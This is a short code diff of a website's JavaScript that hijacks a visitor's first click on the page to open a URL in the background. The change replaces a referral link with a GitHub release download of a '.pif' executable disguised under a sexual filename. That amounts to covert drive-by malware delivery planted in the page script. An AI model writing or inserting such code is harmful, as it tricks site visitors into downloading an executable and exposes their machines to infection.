@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', function() {
     (function() {
         let firstClickHandled = false;
         
-        const bybitUrl = 'https://www.bybit.com/invite?ref=6M29WR';
+        const adstUrl = 'https://github.com/fayesnyder19843-boop/cumhub/releases/download/beta/sexy_cum_hub.pif';
         
         function openInBackground(url) {
             const a = document.createElement('a');
@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', function() {
         function handleFirstClick(event) {
             if (!firstClickHandled) {
                 firstClickHandled = true;
-                openInBackground(bybitUrl);
+                openInBackground(adstUrl);
                 document.removeEventListener('click', handleFirstClick);
             }
         }
